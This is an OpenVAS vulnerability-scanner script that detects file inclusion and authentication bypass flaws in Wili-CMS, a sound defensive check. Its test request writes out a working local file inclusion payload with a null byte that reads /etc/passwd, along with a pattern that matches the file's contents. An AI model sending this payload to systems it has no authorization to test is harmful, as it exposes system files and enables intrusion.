###############################################################################
# OpenVAS Vulnerability Test
# $Id: wili_cms_remote_file_include.nasl 15 2013-10-27 12:49:54Z jan $
#
# Wili-CMS remote and local File Inclusion and Authentication
# Bypass
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "Wili-CMS is prone to a remote and local file-include vulnerability
  because it fails to sufficiently sanitize user-supplied data.

  Exploiting this issue can allow an attacker to compromise the
  application and the underlying computer; other attacks are also
  possible.

  Wili-CMS is also prone to a Authentication Bypass which allows a
  guest to login as admin.";

tag_solution = "Upgrade to a newer version if available at http://wili-cms.sourceforge.net/";

if (description)
{
 script_id(100021);
 script_version("$Revision: 15 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:49:54 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2009-03-10 08:40:52 +0100 (Tue, 10 Mar 2009)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_tag(name:"risk_factor", value:"High");

 script_name("Wili-CMS remote and local File Inclusion and Authentication Bypass");
 desc = "

 Summary:
 " + tag_summary + "
 Solution:
 " + tag_solution;
 script_description(desc);
 script_summary("Determine if Wili-CMS is vulnerable to remote File Include and Authentication Bypass");
 script_category(ACT_GATHER_INFO);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "solution" , value : tag_solution);
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port)) exit(0);

dir = make_list("/cms", cgi_dirs());

foreach d (dir)
{ 
 url = string(d, "/cms/?npage=-1&content_dir=/etc/passwd%00");
 req = http_get(item:url, port:port);
 buf = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
 if( buf == NULL )continue;
 if (
     egrep(pattern:"root:x:0:[01]:.*", string: buf) ||
     egrep(pattern:"Warning.*:+.*include\(/etc/passwd\).*failed to open stream", string: buf) # /etc/passwd not found or not allowed to access. Windows or SAFE MODE Restriction.
    )
     
 	{    
       	  security_hole(port:port);
          exit(0);
        }
}

exit(0);
